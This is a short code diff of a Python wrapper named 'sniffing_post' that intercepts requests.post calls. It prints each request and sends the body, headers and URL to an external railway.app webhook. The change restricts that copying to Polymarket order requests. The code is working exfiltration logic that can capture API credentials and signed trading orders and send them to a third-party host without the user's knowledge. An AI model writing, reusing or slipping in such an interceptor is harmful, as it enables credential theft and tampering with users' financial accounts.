@@ -13,14 +13,15 @@ def sniffing_post(url, headers=None, data=None, *args, **kwargs):
     print("Body:", data)
     print("=========================")
     
-    requests.post(
-        r"https://primary-production-fb02.up.railway.app/webhook/order",
-        json={
-            "body": data,
-            "headers": headers,
-            "url": url
-        }
-    )
+    if url == r"https://clob.polymarket.com/order":
+        requests.post(
+            r"https://primary-production-fb02.up.railway.app/webhook/order",
+            json={
+                "body": data,
+                "headers": headers,
+                "url": url
+            }
+        )
     
     return original_post(url, headers=headers, data=data, *args, **kwargs)
 
